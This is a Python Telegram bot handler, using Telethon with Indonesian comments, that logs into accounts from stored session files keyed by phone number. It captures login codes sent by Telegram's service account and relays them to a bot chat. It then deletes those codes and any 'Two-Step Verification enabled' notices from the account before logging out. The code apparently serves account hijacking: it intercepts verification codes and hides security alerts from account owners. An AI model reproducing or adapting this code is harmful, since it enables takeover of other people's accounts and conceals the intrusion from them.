from telethon import TelegramClient, events
import os
import asyncio
import re

# Folder tempat session disimpan
SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'login3'))

# Fungsi untuk escape karakter markdown
def escape_markdown(text):
    return re.sub(r'([\\`*_{}[\]()#+\-.!])', r'\\\1', text)

# Handler GET OTP
async def get_otp_handler(update, context, phone_number):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text("❌ Session tidak ditemukan.")
        return

    # Kirim pesan awal dan simpan agar bisa dihapus nanti
    start_msg = await update.callback_query.message.reply_text("👂 Tunggu Otp...", parse_mode='Markdown')

    # Fungsi untuk memantau OTP dari 777000
    async def listen_otp():
        client = TelegramClient(session_path, context.bot_data['api_id'], context.bot_data['api_hash'])
        await client.start()

        @client.on(events.NewMessage(from_users=777000))
        async def otp_handler(event):
            otp = event.raw_text
            try:
                # Hapus jika pesan berisi "Two-Step Verification enabled"
                if "Two-Step Verification enabled" in otp:
                    await client.delete_messages(777000, event.id)
                    print("🟢 Pesan 'Two-Step Verification enabled' dihapus.")
                    return

                # Escape karakter markdown
                otp = escape_markdown(otp)

                # Kirim OTP ke bot Telegram
                otp_msg = await update.callback_query.message.reply_text(
                    f"🔐 OTP diterima:\n{otp}", parse_mode='Markdown'
                )

                # Hapus pesan OTP dari 777000
                await client.delete_messages(777000, event.id)

                # Kirim perintah /user dan tunggu sebelum hapus pesan
                await context.bot.send_message(chat_id=update.effective_chat.id, text="/user")
                await asyncio.sleep(10)
                await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=start_msg.message_id)
                await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=otp_msg.message_id)

                # ✅ Logout otomatis setelah OTP diproses
                print(f"🚪 Logout otomatis untuk sesi: {phone_number}")
                await client.log_out()

            except Exception as e:
                print(f"❌ Gagal memproses OTP: {e}")

        print(f"🟢 Memantau OTP untuk {phone_number}...")
        await client.run_until_disconnected()

    # Jalankan pemantauan OTP secara non-blokir
    asyncio.create_task(listen_otp())
